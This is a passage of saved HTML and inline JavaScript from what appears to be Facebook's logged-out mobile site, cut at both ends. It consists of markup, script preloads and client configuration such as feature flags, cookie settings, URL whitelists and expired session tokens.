                  tabindex="0"
                  data-sigil="m-dialog-header-title dialog-title"
                >
                  Loading...
                </div>
              </div>
            </div>
            <div class="_5s61">
              <div class="_52z8" id="modalDialogHeaderButtons"></div>
            </div>
          </div>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
          <div
            class="_2so _2sq _2ss img _50cg"
            data-animtype="1"
            id="u_0_a_+v"
            data-sigil="m-loading-indicator-animate m-loading-indicator-root"
          ></div>
          Loading...
        </div>
      </div>
    </div>
    <script
      id="u_0_j_li"
      crossorigin="anonymous"
      src="https://static.xx.fbcdn.net/rsrc.php/v3imlz4/yx/l/en_GB/7h7eltYM2yJ.js?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="rSSg6U2"
      nonce="htOXv5tP"
    ></script>
    <script id="u_0_k_sz" nonce="htOXv5tP">
      requireLazy(["HasteSupportData"], function (m) {
        m.handle({
          gkxData: {
            5241: { result: true, hash: "AT7o1bCQPGpf3ShEoyo" },
            676920: { result: false, hash: "AT497IX4gOFG8gZezXY" },
            708253: { result: false, hash: "AT5n4hBL3YTMnQWta_s" },
            996940: { result: false, hash: "AT7opYuEGy3sjG1avBY" },
            1263340: { result: false, hash: "AT5bwizWgDaFQudmBeM" },
          },
        });
      });
      requireLazy(
        ["TimeSliceImpl", "ServerJS"],
        function (TimeSlice, ServerJS) {
          new ServerJS().handle({
            define: [
              [
                "CometPersistQueryParams",
                [],
                { relative: {}, domain: {} },
                6231,
              ],
              [
                "BigPipeExperiments",
                [],
                {
                  link_images_to_pagelets: false,
                  enable_bigpipe_plugins: false,
                },
                907,
              ],
              [
                "BootloaderConfig",
                [],
                {
                  deferBootloads: false,
                  jsRetries: [200, 500],
                  jsRetryAbortNum: 2,
                  jsRetryAbortTime: 5,
                  silentDups: false,
                  hypStep4: false,
                  phdOn: false,
                  btCutoffIndex: 605,
                },
                329,
              ],
              [
                "CSSLoaderConfig",
                [],
                {
                  timeout: 5000,
                  modulePrefix: "BLCSS:",
                  loadEventSupported: true,
                },
                619,
              ],
              ["CurrentCommunityInitialData", [], {}, 490],
              [
                "CurrentUserInitialData",
                [],
                {
                  ACCOUNT_ID: "0",
                  USER_ID: "0",
                  NAME: "",
                  SHORT_NAME: null,
                  IS_BUSINESS_PERSON_ACCOUNT: false,
                  HAS_SECONDARY_BUSINESS_PERSON: false,
                  IS_FACEBOOK_WORK_ACCOUNT: false,
                  IS_MESSENGER_ONLY_USER: false,
                  IS_DEACTIVATED_ALLOWED_ON_MESSENGER: false,
                  IS_MESSENGER_CALL_GUEST_USER: false,
                  IS_WORK_MESSENGER_CALL_GUEST_USER: false,
                  APP_ID: "412378670482",
                  IS_BUSINESS_DOMAIN: false,
                },
                270,
              ],
              ["ErrorDebugHooks", [], { SnapShotHook: null }, 185],
              ["ISB", [], {}, 330],
              ["LSD", [], { token: "AVrqJpyOZ5I" }, 323],
              [
                "MRequestConfig",
                [],
                {
                  dtsg: {
                    token: "AQHNg5oMxd_4maA:0:0",
                    valid_for: 86400,
                    expire: 1645181329,
                  },
                  dtsg_ag: {
                    token:
                      "AQy4B6EoWZCCmaCOz-hf-rFMFOmTq-MHslkSBiHKr1HjraZ7:0:0",
                    valid_for: 604800,
                    expire: 1645699729,
                  },
                  lsd: "AVrqJpyOZ5I",
                  checkResponseOrigin: true,
                  checkResponseToken: true,
                  cleanFinishedRequest: false,
                  cleanFinishedPrefetchRequests: false,
                  ajaxResponseToken: {
                    secret: "tUb3SsTN8gTSNcYwOycLHXL7GF0tmRxt",
                    encrypted:
                      "AYn69rkpjv1EE59-QHPKetYMRBqsPAxptt7mEOX_XRt3t0Adj22-eeW8usrvd4heCqrv3mMaeABRmzxJYZc2cw4liTCKYXT968DWhfqye0bViA",
                  },
                },
                51,
              ],
              [
                "ServerNonce",
                [],
                { ServerNonce: "sJqACyyZIYxxkwOodLLptE" },
                141,
              ],
              [
                "SiteData",
                [],
                {
                  server_revision: 1005083598,
                  client_revision: 1005083598,
                  tier: "",
                  push_phase: "C3",
                  pkg_cohort: "BP:mtouch_pkg",
                  haste_session: "19040.BP:mtouch_pkg.2.0.0.0.",
                  pr: 1.5,
                  haste_site: "mobile",
                  be_one_ahead: false,
                  is_rtl: false,
                  is_comet: false,
                  is_experimental_tier: false,
                  is_jit_warmed_up: true,
                  hsi: "7065628919191613740-0",
                  semr_host_bucket: "5",
                  bl_hash_version: 2,
                  skip_rd_bl: true,
                  comet_env: 0,
                  spin: 0,
                  __spin_r: 1005083598,
                  __spin_b: "trunk",
                  __spin_t: 1645094928,
                  vip: "157.240.228.35",
                },
                317,
              ],
              [
                "SprinkleConfig",
                [],
                { param_name: "jazoest", version: 2, should_randomize: false },
                2111,
              ],
              [
                "PromiseUsePolyfillSetImmediateGK",
                [],
                { www_always_use_polyfill_setimmediate: false },
                2190,
              ],
              [
                "KSConfig",
                [],
                {
                  killed: {
                    __set: [
                      "MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER",
                      "MLHUB_FLOW_AUTOREFRESH_SEARCH",
                      "NEKO_DISABLE_CREATE_FOR_SAP",
                      "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
                      "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
                      "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
                      "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
                      "BUY_AT_UI_LINE_DELETE",
                      "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
                      "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
                      "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
                      "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG",
                      "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME",
                      "ADS_STORE_VISITS_METRICS_DEPRECATION",
                      "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER",
                      "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION",
                      "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL",
                      "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS",
                      "LAB_NET_NEW_UI_RELEASE",
                      "POCKET_MONSTERS_CREATE",
                      "POCKET_MONSTERS_DELETE",
                      "SRT_BANZAI_SRT_CORE_LOGGER",
                      "SRT_BANZAI_SRT_MAIN_LOGGER",
                      "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES",
                      "POCKET_MONSTERS_UPDATE_NAME",
                      "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE",
                      "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER",
                      "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD",
                    ],
                  },
                  ko: {
                    __set: [
                      "8H4bQmEiuLT",
                      "3OsLvnSHNTt",
                      "1G7wJ6bJt9K",
                      "9NpkGYwzrPG",
                      "3oh5Mw86USj",
                      "8NAceEy9JZo",
                      "7FOIzos6XJX",
                      "rf8JEPGgOi",
                      "4j36SVzvP3w",
                      "4NSq3ZC4ScE",
                      "53gCxKq281G",
                      "3yzzwBY7Npj",
                      "1onzIv0jH6H",
                      "8PlKuowafe8",
                      "1ntjZ2zgf03",
                      "4SIH2GRVX5W",
                      "2dhqRnqXGLQ",
                      "2WgiNOrHVuC",
                      "amKHb4Cw4WI",
                      "5mNEXob0nTj",
                      "8rDvN9vWdAK",
                      "9cL5o2kjfZo",
                      "5BdzWGmfvrA",
                      "DDZhogI19W",
                      "acrJTh9WGdp",
                      "1oOE64fL4wO",
                      "9Gd8qgRxn8z",
                      "MPMaqnqZ9c",
                      "5XCz1h9Iaw3",
                      "7r6mSP7ofr2",
                      "6DGPLrRdyts",
                      "aWxCyi1sEC7",
                      "9kCSDzzr8fu",
                    ],
                  },
                },
                2580,
              ],
              [
                "JSErrorLoggingConfig",
                [],
                {
                  appId: 412378670482,
                  extra: [],
                  reportInterval: 50,
                  sampleWeight: null,
                  sampleWeightKey: "__jssesw",
                  projectBlocklist: [],
                },
                2776,
              ],
              [
                "ImmediateImplementationExperiments",
                [],
                { prefer_message_channel: true },
                3419,
              ],
              [
                "UriNeedRawQuerySVConfig",
                [],
                {
                  uris: [
                    "dms.netmng.com",
                    "doubleclick.net",
                    "r.msn.com",
                    "watchit.sky.com",
                    "graphite.instagram.com",
                    "www.kfc.co.th",
                    "learn.pantheon.io",
                    "www.landmarkshops.in",
                    "www.ncl.com",
                    "s0.wp.com",
                    "www.tatacliq.com",
                    "bs.serving-sys.com",
                    "kohls.com",
                    "lazada.co.th",
                    "xg4ken.com",
                    "technopark.ru",
                    "officedepot.com.mx",
                    "bestbuy.com.mx",
                    "booking.com",
                    "nibio.no",
                  ],
                },
                3871,
              ],
              ["RunGatingConfig", [], { shouldUseBrowserUnload: true }, 3914],
              [
                "InitialCookieConsent",
                [],
                {
                  deferCookies: false,
                  initialConsent: { __set: [1, 2] },
                  noCookies: false,
                  shouldShowCookieBanner: false,
                },
                4328,
              ],
              [
                "TrustedTypesConfig",
                [],
                { useTrustedTypes: false, reportOnly: false },
                4548,
              ],
              [
                "WebConnectionClassServerGuess",
                [],
                { connectionClass: "GOOD" },
                4705,
              ],
              [
                "BootloaderEndpointConfig",
                [],
                {
                  debugNoBatching: false,
                  endpointURI:
                    "https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/",
                },
                5094,
              ],
              [
                "CookieConsentIFrameConfig",
                [],
                {
                  consent_param:
                    "FQAREhIA.ARaMto1A1euiQj0ukCbTWIv0qqFMADGTI4Nf1gD6RY1w5h3a",
                  allowlisted_iframes: [],
                },
                5540,
              ],
              [
                "cr:696703",
                [],
                {
                  __rc: [
                    null,
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:717822",
                ["TimeSliceImpl"],
                {
                  __rc: [
                    "TimeSliceImpl",
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:729414",
                [],
                {
                  __rc: [
                    null,
                    "Aa3aBivVu7GLxnGxm75jyIMWYS_ivfpyeW8wYlIzBiza7XWEp3FhSeKRJ8LZAdPkj6ucaSvHs3EiqXwWC4WxlIUr",
                  ],
                },
                -1,
              ],
            ],
            require: [
              ["MPrelude"],
              ["VisualCompletionGating"],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [["VisualCompletionGating"], "sd"],
              ],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [["VisualCompletionGating"], "css"],
              ],
            ],
          });
        }
      );
    </script>
    <script>
      now_inl = (function () {
        var p = window.performance;
        return p && p.now && p.timing && p.timing.navigationStart
          ? function () {
              return p.now() + p.timing.navigationStart;
            }
          : function () {
              return new Date().getTime();
            };
      })();
      window.__bigPipeFR = now_inl();
    </script>
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/kkyLGbyp9NX.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/l/0,cross/aktAT6r-inm.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/Acb2WBg1OPJ.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce="htOXv5tP"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/gQXCqyYfa9n.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce="htOXv5tP"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3imlz4/yx/l/en_GB/7h7eltYM2yJ.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce="htOXv5tP"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/0,cross/JSkF6PDP_-u.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/Z0lvzk8hKg6.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/zhzi8IsbkFt.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce="htOXv5tP"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce="htOXv5tP"
    />
    <link
      rel="preload"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/6GjO9u0EGU3.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce="htOXv5tP"
    />
    <script>
      window.__bigPipeCtor = now_inl();
      requireLazy(["BigPipe"], function (BigPipe) {
        define("__bigPipe", [], (window.bigPipe = new BigPipe({
          forceFinish: true,
          config: {
            flush_pagelets_asap: true,
            dispatch_pagelet_replayable_actions: false,
          },
        })));
      });
    </script>
    <script nonce="htOXv5tP">
      (function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
          bigPipe.beforePageletArrive("first_response", n);
        });
      })();
    </script>
    <script nonce="htOXv5tP">
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.onPageletArrive({
          displayResources: [
            "MoYpVB9",
            "0rWB4c7",
            "V7S7y8z",
            "HeTjZuF",
            "rSSg6U2",
            "L+EZvmW",
            "M9i/bZy",
            "pci3ehS",
            "bJ922yg",
            "pzotvyr",
          ],
          id: "first_response",
          phase: 0,
          last_in_phase: true,
          tti_phase: 0,
          all_phases: [63],
          jsmods: {
            define: [
              ["CookieDomain", [], { domain: "facebook.com" }, 6421],
              [
                "CookieCoreConfig",
                [],
                {
                  c_user: {},
                  cppo: { t: 86400 },
                  dpr: { t: 604800 },
                  fbl_ci: { t: 31536000 },
                  fbl_cs: { t: 31536000 },
                  fbl_st: { t: 31536000 },
                  i_user: {},
                  locale: { t: 604800 },
                  m_pixel_ratio: { t: 604800 },
                  noscript: {},
                  presence: { t: 2592000 },
                  sfau: {},
                  usida: {},
                  vpd: { t: 5184000 },
                  wd: { t: 604800 },
                  "x-referer": {},
                  "x-src": { t: 1 },
                },
                2104,
              ],
              ["FbtQTOverrides", [], { overrides: {} }, 551],
              [
                "FbtResultGK",
                [],
                { shouldReturnFbtResult: true, inlineMode: "NO_INLINE" },
                876,
              ],
              [
                "IntlPhonologicalRules",
                [],
                {
                  meta: { "https://facebook.com/_B/": "([.,!?\\s]|^)", "https://facebook.com/_E/": "([.,!?\\s]|$)" },
                  patterns: {
                    "https://facebook.com/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)/":
                      "\u0001$1$2s\u0001$3",
                    "https://facebook.com/_\u0001([^\u0001]*)\u0001/": "javascript",
                  },
                },
                1496,
              ],
              [
                "IntlViewerContext",
                [],
                { GENDER: 3, regionalLocale: null },
                772,
              ],
              [
                "MJSEnvironment",
                [],
                {
                  IS_APPLE_WEBKIT_IOS: false,
                  IS_TABLET: true,
                  IS_ANDROID: true,
                  IS_CHROME: true,
                  IS_FIREFOX: false,
                  IS_WINDOWS_PHONE: false,
                  IS_SAMSUNG_DEVICE: false,
                  OS_VERSION: 8.1,
                  PIXEL_RATIO: 1.3312500715256,
                  BROWSER_NAME: "Chrome Desktop",
                },
                46,
              ],
              [
                "MLoadingIndicatorSigils",
                [],
                {
                  ANIMATE: "m-loading-indicator-animate",
                  ROOT: "m-loading-indicator-root",
                },
                279,
              ],
              [
                "NumberFormatConfig",
                [],
                {
                  decimalSeparator: ".",
                  numberDelimiter: ",",
                  minDigitsForThousandsSeparator: 4,
                  standardDecimalPatternInfo: {
                    primaryGroupSize: 3,
                    secondaryGroupSize: 3,
                  },
                  numberingSystemData: null,
                },
                54,
              ],
              [
                "UserAgentData",
                [],
                {
                  browserArchitecture: "32",
                  browserFullVersion: "70.0.3538.110",
                  browserMinorVersion: 0,
                  browserVersion: 70,
                  deviceName: "Unknown",
                  engineName: "WebKit",
                  engineVersion: "537.36",
                  platformArchitecture: "32"
                },
                527,
              ],
              ["ZeroCategoryHeader", [], {}, 1127],
              [
                "ZeroRewriteRules",
                [],
                {
                  rewrite_rules: {},
                  whitelist: {
                    "https://facebook.com/hr/r": 1,
                    "https://facebook.com/hr/p": 1,
                    "https://facebook.com/zero/unsupported_browser/": 1,
                    "https://facebook.com/zero/policy/optin": 1,
                    "https://facebook.com/zero/optin/write/": 1,
                    "https://facebook.com/zero/optin/legal/": 1,
                    "https://facebook.com/zero/optin/free/": 1,
                    "https://facebook.com/about/privacy/": 1,
                    "https://facebook.com/about/privacy/update/": 1,
                    "https://facebook.com/privacy/explanation/": 1,
                    "https://facebook.com/zero/toggle/welcome/": 1,
                    "https://facebook.com/zero/toggle/nux/": 1,
                    "https://facebook.com/zero/toggle/settings/": 1,
                    "https://facebook.com/fup/interstitial/": 1,
                    "https://facebook.com/work/landing": 1,
                    "https://facebook.com/work/login/": 1,
                    "https://facebook.com/work/email/": 1,
                    "https://facebook.com/ai.php": 1,
                    "https://facebook.com/js_dialog_resources/dialog_descriptions_android.json": 0,
                    "https://facebook.com/connect/jsdialog/MPlatformAppInvitesJSDialog/": 0,
                    "https://facebook.com/connect/jsdialog/MPlatformOAuthShimJSDialog/": 0,
                    "https://facebook.com/connect/jsdialog/MPlatformLikeJSDialog/": 0,
                    "https://facebook.com/qp/interstitial/": 1,
                    "https://facebook.com/qp/action/redirect/": 1,
                    "https://facebook.com/qp/action/close/": 1,
                    "https://facebook.com/zero/support/ineligible/": 1,
                    "https://facebook.com/zero_balance_redirect/": 1,
                    "https://facebook.com/zero_balance_redirect": 1,
                    "https://facebook.com/zero_balance_redirect/l/": 1,
                    "https://facebook.com/l.php": 1,
                    "https://facebook.com/lsr.php": 1,
                    "https://facebook.com/ajax/dtsg/": 1,
                    "https://facebook.com/checkpoint/block/": 1,
                    "https://facebook.com/exitdsite": 1,
                    "https://facebook.com/zero/balance/pixel/": 1,
                    "https://facebook.com/zero/balance/": 1,
                    "https://facebook.com/zero/balance/carrier_landing/": 1,
                    "https://facebook.com/zero/flex/logging/": 1,
                    "https://facebook.com/tr": 1,
                    "https://facebook.com/tr/": 1,
                    "https://facebook.com/sem_campaigns/sem_pixel_test/": 1,
                    "https://facebook.com/bookmarks/flyout/body/": 1,
                    "https://facebook.com/zero/subno/": 1,
                    "https://facebook.com/confirmemail.php": 1,
                    "https://facebook.com/policies/": 1,
                    "https://facebook.com/mobile/internetdotorg/classifier/": 1,
                    "https://facebook.com/zero/dogfooding": 1,
                    "https://facebook.com/xti.php": 1,
                    "https://facebook.com/zero/fblite/config/": 1,
                    "https://facebook.com/hr/zsh/wc/": 1,
                    "https://facebook.com/ajax/bootloader-endpoint/": 1,
                    "https://facebook.com/mobile/zero/carrier_page/": 1,
                    "https://facebook.com/mobile/zero/carrier_page/education_page/": 1,
                    "https://facebook.com/mobile/zero/carrier_page/feature_switch/": 1,
                    "https://facebook.com/mobile/zero/carrier_page/settings_page/": 1,
                    "https://facebook.com/aloha_check_build": 1,
                    "https://facebook.com/upsell/zbd/softnudge/": 1,
                    "https://facebook.com/mobile/zero/af_transition/": 1,
                    "https://facebook.com/mobile/zero/af_transition/action/": 1,
                    "https://facebook.com/mobile/zero/freemium/": 1,
                    "https://facebook.com/mobile/zero/freemium/redirect/": 1,
                    "https://facebook.com/mobile/zero/freemium/zero_fup/": 1,
                    "https://facebook.com/privacy/policy/": 1,
                    "https://facebook.com/privacy/center/": 1,
                    "https://facebook.com/data/manifest/": 1,
                    "https://facebook.com/4oh4.php": 1,
                    "https://facebook.com/autologin.php": 1,
                    "https://facebook.com/birthday_help.php": 1,
                    "https://facebook.com/checkpoint/": 1,
                    "https://facebook.com/contact-importer/": 1,
                    "https://facebook.com/cr.php": 1,
                    "https://facebook.com/legal/terms/": 1,
                    "https://facebook.com/login.php": 1,
                    "https://facebook.com/login/": 1,
                    "https://facebook.com/mobile/account/": 1,
                    "https://facebook.com/n/": 1,
                    "https://facebook.com/remote_test_device/": 1,
                    "https://facebook.com/upsell/buy/": 1,
                    "https://facebook.com/upsell/buyconfirm/": 1,
                    "https://facebook.com/upsell/buyresult/": 1,
                    "https://facebook.com/upsell/promos/": 1,
                    "https://facebook.com/upsell/continue/": 1,
                    "https://facebook.com/upsell/h/promos/": 1,
                    "https://facebook.com/upsell/loan/learnmore/": 1,
                    "https://facebook.com/upsell/purchase/": 1,
                    "https://facebook.com/upsell/promos/upgrade/": 1,
                    "https://facebook.com/upsell/buy_redirect/": 1,
                    "https://facebook.com/upsell/loan/buyconfirm/": 1,
                    "https://facebook.com/upsell/loan/buy/": 1,
                    "https://facebook.com/upsell/sms/": 1,
                    "https://facebook.com/wap/a/channel/reconnect.php": 1,
                    "https://facebook.com/wap/a/nux/wizard/nav.php": 1,
                    "https://facebook.com/wap/appreg.php": 1,
                    "https://facebook.com/wap/birthday_help.php": 1,
                    "https://facebook.com/wap/c.php": 1,
                    "https://facebook.com/wap/confirmemail.php": 1,
                    "https://facebook.com/wap/cr.php": 1,
                    "https://facebook.com/wap/login.php": 1,
                    "https://facebook.com/wap/r.php": 1,
                    "https://facebook.com/zero/datapolicy": 1,
                    "https://facebook.com/a/timezone.php": 1,
                    "https://facebook.com/a/bz": 1,
                    "https://facebook.com/bz/reliability": 1,
                    "https://facebook.com/r.php": 1,
                    "https://facebook.com/mr/": 1,
                    "https://facebook.com/reg/": 1,
                    "https://facebook.com/registration/log/": 1,
                    "https://facebook.com/terms/": 1,
                    "https://facebook.com/f123/": 1,
                    "https://facebook.com/expert/": 1,
                    "https://facebook.com/experts/": 1,
                    "https://facebook.com/terms/index.php": 1,
                    "https://facebook.com/terms.php": 1,
                    "https://facebook.com/srr/": 1,
                    "https://facebook.com/msite/redirect/": 1,
                    "https://facebook.com/fbs/pixel/": 1,
                    "https://facebook.com/contactpoint/preconfirmation/": 1,
                    "https://facebook.com/contactpoint/cliff/": 1,
                    "https://facebook.com/contactpoint/confirm/submit/": 1,
                    "https://facebook.com/contactpoint/confirmed/": 1,
                    "https://facebook.com/contactpoint/login/": 1,
                    "https://facebook.com/preconfirmation/contactpoint_change/": 1,
                    "https://facebook.com/help/contact/": 1,
                    "https://facebook.com/survey/": 1,
                    "https://facebook.com/upsell/loyaltytopup/accept/": 1,
                    "https://facebook.com/settings/": 1,
                    "https://facebook.com/lite/": 1,
                    "https://facebook.com/zero_status_update/": 1,
                    "https://facebook.com/operator_store/": 1,
                    "https://facebook.com/upsell/": 1,
                    "https://facebook.com/wifiauth/login/": 1,
                  },
                },
                1478,
              ],
              [
                "CookieCoreLoggingConfig",
                [],
                {
                  maximumIgnorableStallMs: 16.67,
                  sampleRate: 9.7e-5,
                  sampleRateClassic: 1.0e-10,
                  sampleRateFastStale: 1.0e-8,
                },
                3401,
              ],
              [
                "IntlNumberTypeConfig",
                [],
                {
                  impl: "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }",
                },
                3405,
              ],
              [
                "ServerTimeData",
                [],
                {
                  serverTime: 1645094929116,
                  timeOfRequestStart: 1645094928984.5,
                  timeOfResponseStart: 1645094928984.5,
                },
                5943,
              ],
              [
                "MWebStorageMonsterWhiteList",
                [],
                {
                  whitelist: [
                    "^CacheStorageVersion$",
                    "^RTC_VIDEO_INPUT$",
                    "^RTC_AUDIO_INPUT$",
                    "^RTC_AUDIO_OUTPUT$",
                    "^RTC_IS_AUDIO_ONLY$",
                    "^RTC_NOISE_SUPPRESSION$",
                    "^RTC_MUTE_STATE$",
                    "^Session$",
                    "^_oz_",
                    "^_video_bandwidthEstimate$",
                    "^Banzai$",
                    "^bz",
                    "^banzai\\:last_storage_flush$",
                    "^falco_queue_",
                    "^mutex",
                    "^msys",
                    "^Bandicoot\\:",
                    "^imp_seq_num$",
                    "^qe_switcher_nub_selection$",
                    "^TabId$",
                    "^sp_pi$",
                    "^\\:userchooser\\:osessusers$",
                    "^\\:userchooser\\:settings$",
                    "^brands\\:console\\:config$",
                    "^consoleEnabled$",
                    "^__fb_messenger_desktop_presence_info$",
                    "^vc_",
                    "^_showMDevConsole$",
                    "^ga_client_id$",
                    "^_mswam_$",
                    "^am_recently_used_filters\\:",
                    "^am_image_size_cache$",
                    "^ickt$",
                    "^hb_timestamp$",
                    "^signal_flush_timestamp$",
                    "^last_fast_refresh$",
                    "^_ctv_access_token$",
                    "^_ctv_android_device_info$",
                    "^_ctv_cast_access_token$",
                    "^_ctv_casting_remote$",
                    "^_ctv_console_log_viewer_on_full_screen_player_enabled$",
                    "^_ctv_cookie_consent_displayed$",
                    "^_ctv_debug_redux_logger_enabled$",
                    "^_ctv_deviceUniqueIDFallback$",
                    "^_ctv_gaming_consent_displayed$",
                    "^_ctv_installed_app_player_debug_overlay_enabled$",
                    "^_ctv_last_load_time_ms$",
                    "^_ctv_locale$",
                    "^_ctv_logged_out_constraints_sessions_count$",
                    "^_ctv_reloadedDueToStaleApp$",
                    "^_ctv_reloadedDueToUnrecoverableError$",
                    "^_ctv_search_terms$",
                    "^_ctv_tv_experiments$",
                    "^_ctv_usedCloseAppFallback$",
                    "^_ctv_user_sessions$",
                    "^_ctv_video_debug_overlay_enabled$",
                    "^_ctv_debug_rampart_server_number$",
                    "^fx_did$",
                    "^wa_lang_banner_dismissed$",
                    "^bulletin_article_reader_onload_dialog_seen$",
                    "^bulletin_session_attributes$",
                  ],
                },
                254,
              ],
              [
                "MobileAppDetect",
                [],
                {
                  is_mobile_app: false,
                  is_ads_manager_app: false,
                  is_pages_manager: false,
                  is_facebook_for_android: false,
                  is_facebook_for_android_in_app_browser: false,
                  is_facebook_for_ios: false,
                  is_instagram: false,
                  is_messenger_for_android: false,
                  is_messenger_for_ios: false,
                  is_messenger_lite_for_android: false,
                  is_messenger_lite_for_ios: false,
                  is_wilde: false,
                  is_kaios: false,
                },
                1109,
              ],
              [
                "LinkshimHandlerConfig",
                [],
                {
                  supports_meta_referrer: true,
                  default_meta_referrer_policy: "origin-when-crossorigin",
                  switched_meta_referrer_policy: "origin",
                  non_linkshim_lnfb_mode: null,
                  link_react_default_hash:
                    "AT3CDsOTySXqYpngLgYt4L-TG0SYdxlgd_wUF7NELT6Xj3rFsHb7EXFdEEoflaNLRqXLbSAiI7Z5M3KPJJ6kBGl8qg1FpkiHmMV-v5r9PJHP_CBI2BF_woiRB_F1Hgb8rWwhT0Un6yDTdNTCMISQ",
                  untrusted_link_default_hash:
                    "AT1zdPZbgTGvHEQagCzfeKoBBG8lFDIjqHio21RaTtxABePSCNwCF1gM3-8-pjoU1Uks1zUM_FLqOxhihG8l4cywcHqPT1UK5oXWSEvzw4wa4vHkMiGFeSaw1BVRhan-d9M7OVXBHq5pZbVTUxJc",
                  linkshim_host: "lm.facebook.com",
                  linkshim_path: "https://facebook.com/l.php",
                  linkshim_enc_param: "h",
                  linkshim_url_param: "u",
                  use_rel_no_opener: true,
                  always_use_https: true,
                  onion_always_shim: true,
                  middle_click_requires_event: true,
                  www_safe_js_mode: "asynclazy",
                  m_safe_js_mode: "MLynx_asynclazy",
                  ghl_param_link_shim: false,
                  click_ids: [],
                  is_linkshim_supported: true,
                  current_domain: "facebook.com",
                  blocklisted_domains: [
                    "ad.doubleclick.net",
                    "ads-encryption-url-example.com",
                    "bs.serving-sys.com",
                    "ad.atdmt.com",
                    "adform.net",
                    "ad13.adfarm1.adition.com",
                    "ilovemyfreedoms.com",
                    "secure.adnxs.com",
                  ],
                  is_mobile_device: true,
                },
                27,
              ],
              [
                "MemoryLoggerConfigWebSitevarConfig",
                [],
                { measurement_interval_minutes: 5 },
                5573,
              ],
              ["FWLoader", [], {}, 278],
              ["ImmediateActiveSecondsConfig", [], { sampling_rate: 0 }, 423],
              [
                "MPageControllerGating",
                [],
                {
                  shouldDeferUntilCertainNoRedirect: false,
                  shouldReleaseFetcherLock: false,
                  shouldLoadingScreenSetScriptPath: false,
                  shouldRenderAsync404: false,
                },
                2023,
              ],
              [
                "AnalyticsCoreData",
                [],
                {
                  device_id:
